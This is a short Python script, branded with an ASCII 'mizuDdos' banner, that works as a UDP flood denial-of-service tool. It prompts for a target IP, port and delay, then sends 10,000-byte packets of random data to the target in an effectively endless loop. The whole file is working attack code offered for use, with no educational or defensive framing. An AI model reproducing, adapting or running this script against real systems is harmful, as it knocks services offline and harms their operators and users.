import socket, random, time

print("""
              $$\                     $$$$$$$\        $$\                     
              \__|                    $$  __$$\       $$ |                    
$$$$$$\$$$$\  $$\ $$$$$$$$\ $$\   $$\ $$ |  $$ | $$$$$$$ | $$$$$$\   $$$$$$$\ 
$$  _$$  _$$\ $$ |\____$$  |$$ |  $$ |$$ |  $$ |$$  __$$ |$$  __$$\ $$  _____|
$$ / $$ / $$ |$$ |  $$$$ _/ $$ |  $$ |$$ |  $$ |$$ /  $$ |$$ /  $$ |\$$$$$$\  
$$ | $$ | $$ |$$ | $$  _/   $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ | \____$$\ 
$$ | $$ | $$ |$$ |$$$$$$$$\ \$$$$$$  |$$$$$$$  |\$$$$$$$ |\$$$$$$  |$$$$$$$  |
\__| \__| \__|\__|\________| \______/ \_______/  \_______| \______/ \_______/ 
                                                                              
                  Create by Prilor#2032                                                            
                                                                              
""")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))
 
s.connect((ip, port))
 
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)